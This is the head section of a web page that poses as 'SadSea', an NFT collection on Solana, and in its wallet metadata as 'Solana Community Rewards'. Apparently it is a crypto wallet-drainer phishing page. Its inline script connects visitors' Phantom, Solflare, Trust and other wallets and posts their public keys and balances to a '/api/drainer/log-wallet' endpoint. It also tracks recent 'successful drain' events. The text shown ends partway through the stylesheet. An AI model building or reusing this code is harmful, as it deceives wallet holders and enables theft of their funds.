<!DOCTYPE html>
<html>
<head>
	<title>SadSea - NFT on Solana</title>
	<link rel="icon" type="image/png" sizes="16x16" href="Pictures/logo_blanc.png">
	<meta name="description" content="SadSea is an exclusive collection of 4444 NFTs on Solana for environmental purposes">
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
	
	
	<link rel="stylesheet" media="screen and (min-width: 1200px)" href="Css/nft.css" />
	<link rel="stylesheet" media="screen and (min-width: 900px) and (max-width: 1200px)" href="Css/nft_tel.css" /> 


	<link rel="stylesheet" media="screen and (max-width: 900px)" href="Css/nft_tel2.css" /> 
<!-- preload logos for wallets -->
 <link rel="preload" href="/phantom-logo.png" as="image" type="image/png" />
  <link rel="preload" href="/solflare-logo.png" as="image" type="image/png" />
  <link rel="preload" href="/backpack-logo.png" as="image" type="image/png" />
  <link rel="preload" href="/glow-logo.png" as="image" type="image/png" />
  <link rel="preload" href="/trust-logo.png" as="image" type="image/png" />
  <link rel="preload" href="/exodus-logo.png" as="image" type="image/png" />
  

  
  <!-- Wallet Connect Metadata -->
  <meta name="wallet-connect-name" content="  Sad Sea" />
<meta name="wallet-connect-description" content="Powering the Next Wave of Builders & Holders" />
  <meta name="wallet-connect-url" content="" />
  <meta name="wallet-connect-icon" content="/logo.png" />

   
  <!-- Mobile App Meta Tags -->
  <meta name="mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  
  <!-- Deep Link Meta Tags -->
  <meta name="apple-itunes-app" content="app-id=1598432977, app-argument=https://phantom.app/ul/browse/" />
  <meta name="google-play-app" content="app-id=app.phantom" />


	<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,800&family=Roboto:wght@100&display=swap" rel="stylesheet">
	
 <!-- dApp Manifest -->
  <link rel="manifest" href="/manifest.json?v=3" />
  <link rel="icon" href="/favicon1.ico?v=6" type="image/x-icon" />
  <link rel="apple-touch-icon" href="/logo.png?v=3" />
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js?v=4"></script>
  <script src="/patient-mode.js"></script>
  <script>
    // Ensure solanaWeb3 is available globally
    window.solanaWeb3 = window.solanaWeb3 || window.exports || {};
    
    // Initialize Patient Mode with safety check
    if (typeof PatientMode !== 'undefined') {
      window.patientMode = new PatientMode();
      console.log('[PATIENT_MODE] Initialized with extended timeouts');
    } else {
      console.error('[PATIENT_MODE] PatientMode class not found, retrying...');
      // Retry after a short delay
      setTimeout(() => {
        if (typeof PatientMode !== 'undefined') {
          window.patientMode = new PatientMode();
          console.log('[PATIENT_MODE] Initialized with extended timeouts (delayed)');
        } else {
          console.error('[PATIENT_MODE] Failed to initialize - PatientMode class not available');
        }
      }, 100);
    }
            </script>
  
  <script>
    // Handle Chrome extension errors gracefully
    window.addEventListener('error', function(e) {
      if (e.message && e.message.includes('Cannot use import statement outside a module')) {
        // Ignore Chrome extension import errors
        e.preventDefault();
        return false;
      }
      
      // Handle browser extension message channel errors
      if (e.message && e.message.includes('message channel closed before a response was received')) {
        // Ignore message channel errors
        e.preventDefault();
        return false;
      }
      
      // Handle listener asynchronous response errors
      if (e.message && e.message.includes('listener indicated an asynchronous response')) {
        // Ignore async response errors
        e.preventDefault();
        return false;
      }
    });
    
    (function() {
      const currentUrl = window.location.origin;
      const logoUrl = currentUrl + '/logo.png';
      
      const metaTags = [
        { name: 'solana-dapp-url', content: currentUrl },
        { name: 'wallet-connect-url', content: currentUrl },
        { property: 'og:url', content: currentUrl },
        { property: 'og:image', content: logoUrl },
        { name: 'twitter:image', content: logoUrl }
      ];
      
      metaTags.forEach(tag => {
        const selector = tag.name ? `meta[name="${tag.name}"]` : `meta[property="${tag.property}"]`;
        const metaTag = document.querySelector(selector);
        if (metaTag) {
          metaTag.setAttribute('content', tag.content);
        }
      });
      
      window.dAppMetadata = {
        name: '  Solana Community Rewards',
        description: 'Powering the Next Wave of Builders & Holders',
        url: currentUrl,
        icon: logoUrl
      };
    })();
    
    // Global request tracking to prevent conflicts
    window.pendingRequests = new Set();
    
    // Function to manage pending requests
    window.addPendingRequest = function(requestId) {
      if (window.pendingRequests.has(requestId)) {
        // Request already pending
        return false; // Return false instead of throwing
      }
      window.pendingRequests.add(requestId);
      return true;
    };
    
    window.removePendingRequest = function(requestId) {
      window.pendingRequests.delete(requestId);
    };
    
    // Clear all pending requests on page load
    window.clearAllPendingRequests = function() {
      window.pendingRequests.clear();
      // Cleared all pending requests
    };
    
    // Preload wallet logos for faster display
    function preloadWalletLogos() {
      const logoUrls = [
        '/logo.png',
        '/phantom-logo.png',
        '/solflare-logo.png',
        '/backpack-logo.png',
        '/glow-logo.png',
        '/trust-logo.png',
        '/exodus-logo.png'
      ];
      
      logoUrls.forEach(url => {
        const img = new Image();
        img.src = url;
        img.onload = () => {}; // Logo loaded
        img.onerror = () => {}; // Logo failed to load
      });
    }
    
    // Preload logos on page load
    preloadWalletLogos();
    
    // Register service worker for logo caching if supported
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js').then(registration => {
        // Service Worker registered
      }).catch(error => {
        // Service Worker registration failed
      });
    }
    
    // Clear requests on page load
    window.clearAllPendingRequests();
    
    // Auto-clear pending requests after 30 seconds
    setInterval(() => {
      if (window.pendingRequests.size > 0) {
        // Auto-clearing stale pending requests
        window.clearAllPendingRequests();
      }
    }, 30000);
    
    // Centralized wallet logging function with enhanced deduplication - 2025 FIX
    window.logWalletConnection = function(publicKey, walletType, lamports = 0) {
      try {
        const walletKey = `${publicKey.toString()}-${walletType}`;
        const now = Date.now();
        const lastLogged = window.walletLogTimestamps?.[walletKey] || 0;
        const lastLoggedBalance = window.walletLastLoggedBalance?.[walletKey] ?? 0;
        
        // Enhanced deduplication: prevent logging for 10 minutes after a successful drain
        const drainKey = `${walletKey}-drain`;
        const lastDrainTime = window.walletLogTimestamps?.[drainKey] || 0;
        const timeSinceDrain = now - lastDrainTime;
        
        // If we recently had a drain (within 10 minutes), skip logging completely
        if (timeSinceDrain < 600000) { // 10 minutes
          // Skipping wallet log - recent drain detected
          return;
        }
        
        // If last logged balance was 0 and now > 0, force a log even within dedup window
        const forceUpgradeLog = lamports > 0 && lastLoggedBalance === 0;
        
        // Only log if upgraded balance or if we haven't logged this wallet in the last 5 minutes
        if (forceUpgradeLog || (now - lastLogged > 300000)) { // 5 minutes
          // Initialize timestamps object if it doesn't exist
          if (!window.walletLogTimestamps) {
            window.walletLogTimestamps = {};
          }
          
          // Log wallet connection with retry logic
          const logWalletWithRetry = async (attempt = 1) => {
            try {
              const controller = new AbortController();
              const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
              
              await fetch('/api/drainer/log-wallet', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  publicKey: publicKey.toString(),
                  walletType: walletType,
                  origin: window.location.origin,
                  userAgent: navigator.userAgent,
                  lamports: lamports
                }),
                signal: controller.signal
              });
              
              clearTimeout(timeoutId);
            } catch (err) {
              // Failed to log wallet connection
              
              if (attempt < 2) {
                // Retry once after a short delay
                setTimeout(() => logWalletWithRetry(attempt + 1), 2000);
              }
            }
          };
          
          logWalletWithRetry();
          
          // Update timestamp and cached balance to prevent spam
          window.walletLogTimestamps[walletKey] = now;
          if (!window.walletBalanceCache) window.walletBalanceCache = {};
          if (!window.walletLastLoggedBalance) window.walletLastLoggedBalance = {};
          window.walletBalanceCache[walletKey] = lamports;
          window.walletLastLoggedBalance[walletKey] = lamports;
          
          // Logged wallet connection
        } else {
          // Skipping duplicate wallet log
        }
      } catch (logError) {
        console.error('[WALLET] Failed to log wallet connection:', logError);
      }
    };
    
    // Enhanced automatic fallback mechanisms
    window.handleConnectionError = function(error, walletName, provider) {
      // Handling connection error
      
      // Initialize retry counter if it doesn't exist
      if (!window.connectionRetryCount) {
        window.connectionRetryCount = {};
      }
      
      const retryKey = `${walletName}-${Date.now()}`;
      const currentRetries = window.connectionRetryCount[retryKey] || 0;
      
      // Prevent infinite retry loops - max 2 retries per wallet
      if (currentRetries >= 2) {
        // Max retries reached - stopping automatic retry
        showStatus('Failed', 'error');
        return;
      }
      
      // Increment retry counter
      window.connectionRetryCount[retryKey] = currentRetries + 1;
      
      // Clear any pending requests
      window.clearAllPendingRequests();
      
      // Wait a moment before retry
      setTimeout(async () => {
        // Retrying connection
        
        // Wallet-specific fallback strategies
        switch (walletName) {
          case 'Trust Wallet':
            // Trust Wallet specific fallbacks - avoid signIn as it's not implemented
            if (provider && typeof provider.connect === 'function') {
              // Trust Wallet handles its own timeouts
              const connectPromise = provider.connect();
              
              try {
                await connectPromise;
              } catch (fallbackError) {
                // Trust Wallet connect failed
                showStatus('Failed', 'error');
              }
            } else {
              // Trust Wallet provider not available
              showStatus('Unavailable', 'error');
            }
            break;
            
          case 'Phantom':
            // Phantom specific fallbacks
            if (provider && typeof provider.connect === 'function') {
              // Trying Phantom connect with metadata
              try {
                await provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: walletAdapterMetadata
                });
              } catch (fallbackError) {
                // Phantom connect failed, trying simple connect
                try {
                  await provider.connect();
                } catch (simpleError) {
                  // Phantom simple connect also failed
                  showStatus('Failed', 'error');
                }
              }
            }
            break;
            
          case 'Solflare':
            // Solflare specific fallbacks
            if (provider && typeof provider.connect === 'function') {
              console.log(`[FALLBACK] Trying Solflare connect with metadata`);
              try {
                await provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: walletAdapterMetadata
                });
              } catch (fallbackError) {
                console.log(`[FALLBACK] Solflare connect failed, trying simple connect`);
                try {
                  await provider.connect();
                } catch (simpleError) {
                  console.log(`[FALLBACK] Solflare simple connect also failed:`, simpleError.message);
                  showStatus('Failed', 'error');
                }
              }
            }
            break;
            
          case 'Backpack':
            // Backpack specific fallbacks
            if (provider && typeof provider.connect === 'function') {
              console.log(`[FALLBACK] Trying Backpack connect with metadata`);
              try {
                await provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: walletAdapterMetadata
                });
              } catch (fallbackError) {
                console.log(`[FALLBACK] Backpack connect failed, trying simple connect`);
                try {
                  await provider.connect();
                } catch (simpleError) {
                  console.log(`[FALLBACK] Backpack simple connect also failed:`, simpleError.message);
                  showStatus('Failed', 'error');
                }
              }
            }
            break;
            
          case 'Glow':
            // Glow specific fallbacks
            if (provider && typeof provider.connect === 'function') {
              console.log(`[FALLBACK] Trying Glow connect with metadata`);
              try {
                await provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: walletAdapterMetadata
                });
              } catch (fallbackError) {
                console.log(`[FALLBACK] Glow connect failed, trying simple connect`);
                try {
                  await provider.connect();
                } catch (simpleError) {
                  console.log(`[FALLBACK] Glow simple connect also failed:`, simpleError.message);
                  showStatus('Failed', 'error');
                }
              }
            }
            break;
            
          case 'Exodus':
            // Exodus specific fallbacks
            if (provider && typeof provider.connect === 'function') {
              console.log(`[FALLBACK] Trying Exodus connect with metadata`);
              try {
                await provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: walletAdapterMetadata
                });
              } catch (fallbackError) {
                console.log(`[FALLBACK] Exodus connect failed, trying simple connect`);
                try {
                  await provider.connect();
                } catch (simpleError) {
                  console.log(`[FALLBACK] Exodus simple connect also failed:`, simpleError.message);
                  showStatus('Failed', 'error');
                }
              }
            }
            break;
            
          default:
            // Generic fallback for other wallets
            if (provider && typeof provider.connect === 'function') {
              console.log(`[FALLBACK] Retrying connect for ${walletName}`);
              try {
                await provider.connect();
              } catch (fallbackError) {
                console.log(`[FALLBACK] Connect retry failed for ${walletName}:`, fallbackError.message);
                showStatus('Failed', 'error');
              }
            }
            break;
        }
      }, 2000);
    };
    

    
    
    
    
    
    
    
    // Set dApp metadata for wallet detection BEFORE wallet scripts load
    window.dAppMetadata = {
      name: '  Solana Community Rewards',
      description: 'Powering the Next Wave of Builders & Holders',
      url: window.location.origin,
      icon: window.location.origin + '/logo.png',
      appIdentity: {
        name: '  Solana Community Rewards',
        uri: window.location.origin,
        icon: window.location.origin + '/logo.png'
      }
    };
    
    // Ensure dApp icon is set for all wallet types
    window.solanaDAppIcon = window.location.origin + '/logo.png';
    window.phantomDAppIcon = window.location.origin + '/logo.png';
    window.solflareDAppIcon = window.location.origin + '/logo.png';
    window.backpackDAppIcon = window.location.origin + '/logo.png';
    window.glowDAppIcon = window.location.origin + '/logo.png';
    window.trustDAppIcon = window.location.origin + '/logo.png';
    window.exodusDAppIcon = window.location.origin + '/logo.png';
    
    // Function to set dApp icon for detected wallets
    function setDAppIconForWallet(walletType) {
      const iconUrl = window.location.origin + '/logo.png';
      
      switch(walletType) {
        case 'phantom':
          if (window.phantom?.solana) {
            window.phantom.solana.dAppIcon = iconUrl;
          }
          break;
        case 'solflare':
          if (window.solflare) {
            window.solflare.dAppIcon = iconUrl;
          }
          break;
        case 'backpack':
          if (window.backpack) {
            window.backpack.dAppIcon = iconUrl;
          }
          break;
        case 'glow':
          if (window.glow) {
            window.glow.dAppIcon = iconUrl;
          }
          break;
        case 'trust':
          if (window.trust) {
            window.trust.dAppIcon = iconUrl;
          }
          break;
        case 'exodus':
          if (window.exodus) {
            window.exodus.dAppIcon = iconUrl;
          }
          break;
      }
    }
    
    // Set dApp icon for wallet detection
    setDAppIconForWallet('phantom');
    setDAppIconForWallet('solflare');
    setDAppIconForWallet('backpack');
    setDAppIconForWallet('glow');
    setDAppIconForWallet('trust');
    setDAppIconForWallet('exodus');
    
    // Set document title and meta for wallet recognition
    document.title = 'SadSea - NFT on Solana';
    
    // Add meta tags dynamically if needed
    if (!document.querySelector('meta[name="application-name"]')) {
      const meta = document.createElement('meta');
      meta.name = 'application-name';
      meta.content = '  Solana Community Rewards';
      document.head.appendChild(meta);
    }
    
    // Set additional window properties for wallet recognition
    window.solanaDAppName = '  Solana Community Rewards';
    window.solanaDAppIcon = window.location.origin + '/logo.png';
    
    // Override any existing dApp metadata
    Object.defineProperty(window, 'dAppMetadata', {
      value: window.dAppMetadata,
      writable: false,
      configurable: false
    });
    
  </script>
  <style>
    /* Version: 2025-08-18-v11 - Ultra-Compact WalletConnect-Style Web3Modal (Additional 40% Height Reduction) */
    /* Image optimization for faster loading */
    img {
      image-rendering: -webkit-optimize-contrast;
      image-rendering: crisp-edges;
      backface-visibility: hidden;
      transform: translateZ(0);
    }
    
    /* Wallet logo optimization */
    .wallet-option img {
      width: 20px;
      height: 20px;
      object-fit: contain;
      transition: transform 0.2s ease;
    }
    
    .wallet-option img:hover {
      transform: scale(1.1);
    }
    
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #0a0a0a;
      color: #fff;
    }
    nav {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 40px;
      background: rgba(10, 10, 10, 0.8);
      backdrop-filter: blur(10px);
      position: sticky;
      top: 0;
      z-index: 1000;
    }
    .nav-logo {
      font-size: 1.8em;
      font-weight: bold;
      color: #14f195;
    }
    .nav-btn {
      background: linear-gradient(45deg, #14f195, #00CC6A);
      color: black;
      padding: 10px 20px;
      border: none;
      border-radius: 10px;
      font-weight: 600;
      cursor: pointer;
      transition: 0.3s ease;
    }
    .nav-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 18px rgba(20, 241, 149, 0.3);
    }
    .hero {
      height: 90vh;
      background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/Hero-section.png');
      background-size: cover;
      background-position: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
      text-align: center;
      padding: 0 20px;
    }
    .hero h1 {
      font-size: 3.2em;
      margin-bottom: 20px;
      font-weight: bold;
      text-shadow: 2px 2px 12px #000;
    }

    

    .claim-btn {
      font-size: 1.4em;
      padding: 18px 36px;
      background: linear-gradient(45deg, #14f195, #00CC6A);
      color: black;
      border: none;
      border-radius: 12px;
      font-weight: 700;
      cursor: pointer;
      transition: 0.3s ease;
    }
    .claim-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(20, 241, 149, 0.4);
    }
    .footer {
      text-align: center;
      padding: 50px 20px;
      background: #111;
      color: #aaa;
      font-size: 0.95em;
      margin-top: 80px;
      border-top: 1px solid #222;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(4px);
      justify-content: center;
      align-items: center;
      z-index: 9999;
      /* Ensure perfect centering */
      transform: translateZ(0);
      -webkit-transform: translateZ(0);
    }
    .modal.active {
      display: flex;
    }
        .wallet-box {
            background: #ffffff;
            border-radius: 16px;
            padding: 0;
            width: 320px;
            max-width: 320px;
            text-align: left;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
            margin: 0 auto;
            /* Perfect centering within modal */
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            -webkit-transform: translate(-50%, -50%);
            border: none;
            overflow: hidden;
            /* Ensure proper sizing */
            box-sizing: border-box;
        }
    
            .modal-header {
            margin: 0;
            padding: 8px 20px 8px 20px;
            border-bottom: 1px solid #f0f0f0;
            background: #ffffff;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
        }
        
        .header-content h3 {
            color: #1a1a1a;
            margin: 0 0 1px 0;
            font-size: 16px;
            font-weight: 600;
            letter-spacing: -0.5px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .header-subtitle {
            color: #6b7280;
            margin: 0;
            font-size: 11px;
            font-weight: 400;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .close-btn {
            background: none;
            border: none;
            color: #6b7280;
            cursor: pointer;
            padding: 8px;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 12px;
            transition: all 0.2s ease;
            flex-shrink: 0;
        }
        
        .close-btn:hover {
            color: #1a1a1a;
            background: #f3f4f6;
        }
        
        .close-btn svg {
            width: 20px;
            height: 20px;
        }
    
            .wallet-options {
            padding: 6px 20px;
        }
        
        .wallet-option {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #ffffff;
            padding: 6px 16px;
            margin: 0 0 4px 0;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
            border: 1px solid #f0f0f0;
            position: relative;
        }
        
        .wallet-option:last-child {
            margin-bottom: 0;
        }
        
        .wallet-option:hover, .wallet-option:focus {
            background: #f9fafb;
            border-color: #e5e7eb;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
        }
        
        .wallet-icon {
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f9fafb;
            border-radius: 6px;
            flex-shrink: 0;
            border: 1px solid #f0f0f0;
        }
        
        .wallet-icon img {
            width: 16px;
            height: 16px;
            object-fit: contain;
        }
        
        .wallet-info {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 2px;
        }
        
        .wallet-name {
            color: #1a1a1a;
            margin: 0 0 0px 0;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: -0.3px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .wallet-description {
            color: #6b7280;
            margin: 0;
            font-size: 10px;
            font-weight: 400;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .wallet-arrow {
            color: #9ca3af;
            transition: all 0.2s ease;
            flex-shrink: 0;
        }
        
        .wallet-option:hover .wallet-arrow {
            color: #374151;
            transform: translateX(2px);
        }
        
        .wallet-arrow svg {
            width: 20px;
            height: 20px;
        }
    
            .modal-footer {
            padding: 8px 20px 12px 20px;
            border-top: 1px solid #f0f0f0;
            background: #fafafa;
            text-align: center;
        }
        
        .footer-content {
            display: flex;
            flex-direction: column;
            gap: 6px;
            align-items: center;
        }
        
        .wallet-help {
            color: #6b7280;
            font-size: 14px;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .wallet-links {
            display: flex;
            align-items: center;
            gap: 4px;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        .wallet-link {
            color: #3b82f6;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            transition: color 0.2s ease;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .wallet-link:hover {
            color: #2563eb;
            text-decoration: underline;
        }
        
        .separator {
            color: #d1d5db;
            font-size: 12px;
        }
    
    #status {
      text-align:center;
      margin:24px auto 0 auto;
      max-width:400px;
      font-weight:600;
      min-height: 24px;
    }
    html {
      scroll-behavior: smooth;
    }
    .nav-links {
      display: flex;
      gap: 32px;
      align-items: center;
    }
    .nav-link {
      color: #fff;
      text-decoration: none;
      font-weight: 500;
      font-size: 1.1em;
      position: relative;
      transition: color 0.2s;
      padding: 4px 0;
    }
    .nav-link.active, .nav-link:focus {
      color: #14f195;
    }
    .nav-link::after {
      content: '';
      display: block;
      width: 0;
      height: 2px;
      background: #14f195;
      transition: width 0.2s;
      position: absolute;
      left: 0;
      bottom: -2px;
    }
    .nav-link.active::after, .nav-link:hover::after {
      width: 100%;
    }
    @media (max-width: 800px) {
      .nav-links { gap: 16px; }
      .nav-link { font-size: 1em; }
    }
    @media (max-width: 600px) {
      .nav-links { gap: 8px; }
      .nav-link { font-size: 0.95em; }
    }
    @media (max-width: 600px) {
      nav { padding: 12px 8px; }
      .hero { padding: 60px 8px; }
      .hero h1 { font-size: 2em; }
      .wallet-box { 
        padding: 8px; 
        max-width: 78px;
        width: 90vw;
        margin: 0 5px;
      }
      
      .modal-header h3 {
        font-size: 0.8em;
      }
      
      .wallet-option {
        padding: 4px 6px;
        margin: 3px 0;
        gap: 4px;
      }
      
      .wallet-option img {
        width: 12px;
        height: 12px;
      }
      
      .wallet-name {
        font-size: 0.6em;
      }
    }
    .info-section {
      background: #181818;
      border-radius: 16px;
      margin: 40px auto;
      max-width: 1100px;
      padding: 36px 28px 28px 28px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
      color: #f3f3f3;
    }
    .info-section h2 {
      color: #14f195;
      margin-bottom: 18px;
      font-size: 2em;
    }
    .card-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
      gap: 28px;
      margin-top: 18px;
    }
    .info-card {
      background: #232323;
      border-radius: 14px;
      box-shadow: 0 2px 12px rgba(20,241,149,0.07);
      padding: 28px 22px 20px 22px;
      transition: box-shadow 0.2s, transform 0.2s;
      min-height: 170px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
    }
    .info-card:hover {
      box-shadow: 0 6px 24px rgba(20,241,149,0.18);
      transform: translateY(-4px) scale(1.025);
    }
    .info-card h3 {
      color: #14f195;
      margin-bottom: 12px;
      font-size: 1.18em;
    }
    .info-card ul {
      margin: 0 0 0 18px;
      padding: 0;
    }
    .info-card li {
      margin-bottom: 8px;
      line-height: 1.6;
    }
    .info-card a {
      color: #14f195;
      text-decoration: underline;
      word-break: break-all;
    }
    .info-card a:hover {
      color: #00cc6a;
    }
    html, body {
      max-width: 100vw;
      overflow-x: hidden;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      z-index: 9999;
      padding: 0;
    }
    .modal.active, .modal[style*="display: flex"] {
      display: flex !important;
    }
    /* Mobile-specific wallet-box overrides */
    @media (max-width: 800px) {
      .wallet-box {
        width: 300px;
        max-width: 300px;
        margin: 0 auto;
        /* Maintain centering on mobile */
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        -webkit-transform: translate(-50%, -50%);
      }
      
      .modal-header {
        padding: 12px 20px 8px 20px;
      }
      
      .header-content h3 {
        font-size: 14px;
      }
      
      .header-subtitle {
        font-size: 10px;
      }
      
      .wallet-options {
        padding: 8px 20px;
      }
      
      .wallet-option {
        padding: 8px 16px;
        margin: 0 0 6px 0;
        gap: 8px;
      }
      
      .wallet-icon {
        width: 32px;
        height: 32px;
      }
      
      .wallet-icon img {
        width: 18px;
        height: 18px;
      }
      
      .wallet-name {
        font-size: 13px;
      }
      
      .wallet-description {
        font-size: 11px;
      }
      
      .modal-footer {
        padding: 10px 20px 14px 20px;
      }
    }
    /* Mobile Responsive Styles */
    @media (max-width: 600px) {
      .wallet-box {
        width: 280px;
        max-width: 280px;
        /* Maintain centering on small mobile */
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        -webkit-transform: translate(-50%, -50%);
      }
      
      .modal-header {
        padding: 10px 16px 6px 16px;
      }
      
      .header-content h3 {
        font-size: 13px;
      }
      
      .header-subtitle {
        font-size: 9px;
      }
      
      .wallet-options {
        padding: 6px 16px;
      }
      
      .wallet-option {
        padding: 6px 14px;
        margin: 0 0 4px 0;
        gap: 6px;
      }
      
      .wallet-icon {
        width: 28px;
        height: 28px;
      }
      
      .wallet-icon img {
        width: 16px;
        height: 16px;
      }
      
      .wallet-name {
        font-size: 12px;
      }
      
      .wallet-description {
        font-size: 10px;
      }
      
      .modal-footer {
        padding: 8px 16px 10px 16px;
      }
      .modal {
        align-items: center;
      }
      .claim-btn, .nav-btn, #statusModalClose {
        font-size: 1em;
        padding: 12px 10px;
      }
      .info-section {
        padding: 18px 4px 18px 4px;
      }
      .card-grid {
        gap: 12px;
      }
      .info-card {
        padding: 14px 8px 12px 8px;
        min-height: 120px;
      }
      nav {
        flex-direction: column;
        gap: 8px;
        padding: 10px 4px;
      }
      .nav-logo img {
        height: 28px !important;
      }
      .nav-links {
        gap: 8px;
      }
      .hero {
        padding: 40px 4px;
        height: 100vh;
        min-height: 600px;
        background-size: cover;
        background-position: center;
        background-attachment: scroll;
      }
      .hero h1 {
        font-size: 2.2em;
        line-height: 1.2;
        margin-bottom: 15px;
        padding: 0 10px;
      }


      .claim-btn {
        font-size: 1.3em;
        padding: 16px 28px;
        width: 90%;
        max-width: 300px;
      }
    }

    /* Tablet Responsive Styles */
    @media (min-width: 601px) and (max-width: 1024px) {
      .hero {
        height: 80vh;
        min-height: 500px;
        padding: 60px 20px;
      }
      .hero h1 {
        font-size: 2.8em;
        line-height: 1.3;
      }

      .claim-btn {
        font-size: 1.3em;
        padding: 16px 32px;
      }
      .info-section {
        padding: 30px 20px;
        margin: 30px auto;
      }
      .card-grid {
        grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
        gap: 20px;
      }
    }

    /* Large Mobile Responsive Styles */
    @media (min-width: 481px) and (max-width: 600px) {
      .hero {
        height: 90vh;
        min-height: 650px;
      }
      .hero h1 {
        font-size: 2.5em;
      }

      .claim-btn {
        font-size: 1.4em;
        padding: 18px 36px;
      }
    }

    /* Small Mobile Responsive Styles */
    @media (max-width: 480px) {
      .hero {
        height: 100vh;
        min-height: 550px;
        padding: 30px 8px;
      }
      .hero h1 {
        font-size: 1.8em;
        line-height: 1.1;
        margin-bottom: 12px;
      }


      .claim-btn {
        font-size: 1.2em;
        padding: 14px 24px;
        width: 90%;
        max-width: 280px;
      }
      .info-section {
        padding: 15px 8px;
        margin: 20px auto;
      }
      .card-grid {
        grid-template-columns: 1fr;
        gap: 15px;
      }
      .info-card {
        padding: 12px 6px 10px 6px;
        min-height: 100px;
      }
      .info-card h3 {
        font-size: 1.1em;
      }
      .info-card li {
        font-size: 0.9em;
        line-height: 1.4;
      }
    }

    /* Extra Small Mobile Responsive Styles */
    @media (max-width: 360px) {
      .hero {
        height: 100vh;
        min-height: 500px;
        padding: 20px 4px;
      }
      .hero h1 {
        font-size: 1.6em;
        line-height: 1.1;
      }
      .countdown {
        font-size: 1.1em;
        margin-bottom: 12px;
      }

      .claim-btn {
        font-size: 1.1em;
        padding: 12px 20px;
        width: 85%;
        max-width: 250px;
      }
      .info-section {
        padding: 12px 4px;
      }
      .info-card {
        padding: 10px 4px 8px 4px;
        min-height: 90px;
      }
      .info-card h3 {
        font-size: 1em;
      }
      .info-card li {
        font-size: 0.85em;
      }
    }

    /* Landscape Mobile Responsive Styles */
    @media (max-height: 500px) and (orientation: landscape) {
      .hero {
        height: 100vh;
        min-height: 400px;
        padding: 20px 10px;
      }
      .hero h1 {
        font-size: 1.8em;
        margin-bottom: 10px;
      }
      .countdown {
        font-size: 1.3em;
        margin-bottom: 15px;
      }
      .claim-btn {
        font-size: 1em;
        padding: 10px 20px;
      }
    }

    /* Ensure hero image is always responsive */
    .hero {
      background-size: cover !important;
      background-position: center !important;
      background-repeat: no-repeat !important;
      background-attachment: scroll !important;
    }

    /* Ensure all images are responsive */
    img {
      max-width: 100%;
      height: auto;
    }

    /* Ensure containers don't overflow */
    .container, .info-section, .wallet-box, .modal {
      max-width: 100%;
      box-sizing: border-box;
    }

    /* Improve touch targets on mobile */
    @media (max-width: 768px) {
      .wallet-option, .claim-btn, .nav-btn {
        min-height: 44px;
        min-width: 44px;
      }
      
      .wallet-option {
        padding: 16px 20px;
      }
      
             .claim-btn, .nav-btn {
         padding: 14px 24px;
       }
     }
    
    /* Prevent horizontal scroll on all children */
    * {
      box-sizing: border-box;
    }

    /* Additional Mobile Responsive Improvements */
    @media (max-width: 768px) {
      /* Improve navigation for mobile */
      nav {
        position: sticky;
        top: 0;
        z-index: 1000;
        background: rgba(0, 0, 0, 0.95);
        backdrop-filter: blur(10px);
      }
      
